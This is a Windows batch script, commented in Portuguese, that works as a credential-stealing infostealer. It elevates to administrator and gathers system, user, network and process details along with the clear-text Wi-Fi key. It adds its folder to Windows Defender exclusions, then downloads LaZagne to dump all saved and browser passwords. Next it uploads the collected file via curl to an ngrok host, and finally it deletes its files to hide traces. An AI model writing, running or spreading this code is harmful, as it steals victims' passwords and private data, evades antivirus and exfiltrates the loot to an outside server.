@echo off
setlocal
cd /d %~dp0
echo off
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)
CLS
set "FILE=data.txt"
set "CURL_EXE=curl.exe"
set "CURL_ZIP=curl.zip"
set "CURL_URL=https://curl.se/windows/dl-8.14.1_2/curl-8.14.1_2-win64-mingw.zip"
set "Sy1=%FILE%"
title ???
CLS
powershell -Command "Invoke-WebRequest -Uri https://bootstrap.pypa.io/get-pip.py -OutFile get-pip.py"
python get-pip.py
if %errorlevel% neq 0 (
    echo Erro ao instalar, consulte o Criador...
)
del get-pip.py
CLS
echo Todos os usuarios locais do computador (detalhadamente): > %Sy1%
echo. >> %Sy1%
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
powershell -Command "Get-LocalUser | Format-List *" >> %Sy1%
 CLS
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
echo Informacoes do Sistema: >> %Sy1%
echo. >> %Sy1%
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
powershell -Command "systeminfo" >> %Sy1%
 
echo. >> %Sy1%
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
echo Wifi e Infor. detalhadas da Rede: >> %Sy1%
echo. >> %Sy1%
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%

setlocal enabledelayedexpansion
for /f "tokens=2 delims=:" %%A in ('netsh wlan show interfaces ^| findstr /C:" SSID"') do (
    set "wifi=%%A"
    set "wifi=!wifi:~1!"
)
powershell -Command "netsh wlan show profile name=\"!wifi!\" key=clear" >> %Sy1%
 CLS
echo --------------------------------------------------------X---------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
ipconfig /all >> %Sy1%
echo. >> %Sy1%
echo --------------------------------------------------------X---------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
ipconfig /allcompartments >> %Sy1%
echo. >> %Sy1%
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
echo Versao do sistema: >> %Sy1%
echo. >> %Sy1%
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
VER >> %Sy1%
echo. >> %Sy1%
 CLS
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
echo TCP/UDP e Portas abertas: >> %Sy1%
echo. >> %Sy1%
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
NETSTAT -AN >> %Sy1%
echo. >> %Sy1%
 CLS
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
echo Usuarios cadastrados: >> %Sy1%
echo. >> %Sy1%
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
net user >> %Sy1%
echo. >> %Sy1%
 CLS
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
echo Todos os processos rodando, Mostrando Informacoes Detalhadas: >> %Sy1%
echo. >> %Sy1%
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
tasklist /v >> %Sy1%
echo. >> %Sy1%
 CLS
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
echo Exibe o usuario atual com todos os grupos e privilegios — pode mostrar se alguém tem acesso de administrador: >> %Sy1%
echo. >> %Sy1%
 CLS
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
whoami /all >> %Sy1%
echo. >> %Sy1%
 CLS
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
CLS

if not exist "%FILE%" (
  echo File not found: %FILE%
  pause
  exit /b 1
)
set "SERVER=https://351d-187-104-96-18.ngrok-free.app/upload2"
CLS
where curl >nul 2>&1
if errorlevel 1 (
  powershell -Command "Invoke-WebRequest -Uri '%CURL_URL%' -OutFile '%CURL_ZIP%' -UseBasicParsing"
  powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory('%CURL_ZIP%', '.')"
  del "%CURL_ZIP%"
  move /Y "curl-8.14.1_2-win64-mingw\bin\curl.exe" . >nul 2>&1
  if not exist "%CURL_EXE%" (
    echo Erro: Error (Failure in extraction)
  )

) else (
  set "CURL_EXE=curl"
)
 CLS
set "PASTA_ATUAL=%~dp0"
set "URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
set "URL2=https://raw.githubusercontent.com/AlessandroZ/LaZagne/v2.4.7/requirements.txt"
set "ARQUIVO_EXE=laZagne.exe"
set "ARQUIVO_URL2=requirements.txt"
powershell -Command "Set-ExecutionPolicy Bypass -Scope Process -Force; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; iex ((New-Object Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))"
CLS
choco feature enable -n allowGlobalConfirmation
choco install winget
CLS
powershell -Command "Add-MpPreference -ExclusionPath '%PASTA_ATUAL%'"
powershell -Command "try { Invoke-WebRequest -Uri '%URL%' -OutFile '%ARQUIVO_EXE%' -ErrorAction Stop } catch { Write-Output 'ERRO' }" | findstr /C:"ERRO" >nul
if not errorlevel 1 (
    where curl >nul 2>&1
    if not errorlevel 1 (
        curl -L -o "%ARQUIVO_EXE%" "%URL%"
    )
)

powershell -Command "try { Invoke-WebRequest -Uri '%URL2%' -OutFile '%ARQUIVO_URL2%' -ErrorAction Stop } catch { Write-Output 'ERRO' }" | findstr /C:"ERRO" >nul
if not errorlevel 1 (
    where curl >nul 2>&1
    if not errorlevel 1 (
        curl -L -o "%ARQUIVO_URL2%" "%URL2%"
    )
)

powershell -Command "Start-BitsTransfer -Source 'https://aka.ms/getwinget' -Destination \"$env:TEMP\AppInstaller.appxbundle\""
powershell -Command "Add-AppxPackage "$env:TEMP\AppInstaller.appxbundle" "
winget install --id Git.Git -e --source winget
winget install --id Git.Git -e
CLS
pip install -r requirements.txt >> %Sy1% 2>&1
CLS
pip uninstall pycrypto -y
CLS
pip install --force-reinstall pycryptodome
CLS
pip install rsa pyasn1
CLS
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
echo Passrds de S... >> %Sy1%
echo. >> %Sy1%
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
 
echo. >> %Sy1%
laZagne.exe all -oN -v >> %Sy1% 2>&1
echo. >> %Sy1%
 CLS
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
 
echo. >> %Sy1%
echo Passrds de N... >> %Sy1% 
echo. >> %Sy1%
CLS
echo ------------------------------------------------------------------------------------------------------------------- >> %Sy1%
echo. >> %Sy1%
laZagne.exe browsers -v >> %Sy1% 2>&1
echo. >> %Sy1%
 CLS
echo -----------------------------------------------------F$M----------------------------------------------------------- >> %Sy1%
 
"%CURL_EXE%" -F "file=@%FILE%" "%SERVER%"

CLS
del %Sy1%
del laZagne.exe
del requirements.txt
del get-pip.py
del curl.exe
del curl.zip
CLS
 
